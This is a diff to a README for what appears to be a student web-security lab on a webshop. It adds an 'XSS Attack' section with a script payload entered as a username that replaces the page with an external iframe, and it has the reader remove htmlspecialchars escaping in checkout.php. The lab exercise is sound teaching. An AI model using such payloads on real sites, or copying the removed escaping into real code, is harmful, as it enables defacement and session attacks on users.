@@ -28,7 +28,29 @@ while($row = $statement->fetch(\PDO::FETCH_ASSOC)) {
 }
 ```
 
-* Now go to "Beställingar" and see what everybody has ordered!
+* Now go to "Beställningar" and see what everybody has ordered!(spooky)
+
+# XSS Attack
+
+* Create a user with username such as:
+```
+<script>
+document.body.innerHTML=
+ '<iframe src="https://antongoransson.github.io"
+ width="100%"
+ height="90%"
+ frameborder="0" />';
+</script>
+```
+* Remove for example the following code in header in checkout.php: (You might need
+	to comment the $username line in addUser in db.php also)
+
+```
+htmlspecialchars($_SESSION["username"], ENT_QUOTES, 'UTF-8');
+```
+* Replace it with : $\_SESSION["username"]
+
+* Now enter the checkout page and see what happens! (spooky)
 
 # CSFR attack
 
